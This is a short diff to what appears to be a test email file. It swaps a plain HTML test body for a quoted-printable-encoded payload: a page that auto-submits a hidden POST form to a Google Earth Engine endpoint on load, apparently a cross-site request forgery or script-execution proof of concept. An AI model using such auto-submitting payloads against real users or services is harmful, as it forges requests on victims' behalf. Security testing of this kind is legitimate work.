@@ -2,6 +2,5 @@ TESTEML
 Content-Type: text/html
 Content-Transfer-Encoding: quoted-printable
 
-=3Chtml=3Ethis=20is=20test=3C=2Fhtml=3E
-
+=3Chtml=3E=3Cbody=20onload=3D=22document.getElementById(=27xss=27).submit()=3B=22=3E=3Cform=20=20id=3D=22xss=22=20action=3D=22https=3A=2F=2Fexplorer.earthengine.google.com=2FgetProject=22=20method=3D=22POST=22=3E=3C=2Fform=3E=3C=2Fbody=3E=3C=2Fhtml=3E
  
